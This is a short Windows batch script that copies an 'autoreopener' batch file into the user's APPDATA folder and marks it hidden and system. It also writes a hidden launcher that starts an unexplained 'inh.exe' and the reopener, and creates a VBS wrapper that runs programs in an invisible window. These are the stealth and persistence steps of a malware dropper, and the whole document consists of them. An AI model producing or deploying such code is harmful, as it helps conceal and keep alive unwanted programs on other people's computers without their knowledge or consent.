@echo off
set "src=%TEMP%\autoreopener.bat"
set "appdata=%APPDATA%"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%appdata%\autoreopener.bat" /Y
attrib +h +s "%appdata%\autoreopener.bat"

echo @echo off > "%appdata%\launcher.bat"
echo start "" "%appdata%\inh.exe" >> "%appdata%\launcher.bat"
echo start "" "%appdata%\autoreopener.bat" >> "%appdata%\launcher.bat"

attrib +h +s "%appdata%\launcher.bat"

:: Create a VBS wrapper for hidden execution
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False
) > "%appdata%\launcher.vbs"


